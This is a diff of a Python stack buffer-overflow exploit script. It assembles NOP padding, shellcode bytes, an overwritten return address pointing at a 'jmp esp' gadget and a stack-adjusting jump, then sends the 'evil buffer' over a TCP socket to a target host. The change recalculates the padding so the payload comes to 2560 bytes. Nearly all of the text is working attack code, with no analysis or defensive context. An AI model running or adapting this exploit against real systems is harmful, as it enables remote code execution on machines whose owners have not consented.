@@ -64,17 +64,18 @@ shellcode += b"\x20\x5c\x1a\x56\x39\x09\x1c\xc5\x3a\x18"
 ### 148010cf ffe4            jmp     esp
 
 
-# payload:
+# payload (2560):
 nops        = b"\x90" * (2288-len(shellcode))
 eip         = struct.pack("<I", 0x148010cf)
 jmp         = b"\x81\xC4\x20\xFE\xFF\xFF" + b"\xFF\xE4" # ADD ESP,-480; JMP ESP
 offset1     = b"C" * 8
-offset2     = b"D" * (260-len(jmp))
+offset2     = b"D" * (2560-len(nops+shellcode+eip+offset1+jmp))
 payload     = nops + shellcode + eip + offset1 + jmp + offset2
 
 ###
 # buffer:
 buffer = payload
+
 try:
     print("\nSending evil buffer...")
 
@@ -82,9 +83,9 @@ try:
     s.connect((host, port))
     s.send(buffer)
     s.close()
-  
+
     print("\nDone!")
-  
+
 except socket.error:
     print("\nCould not connect!")
 
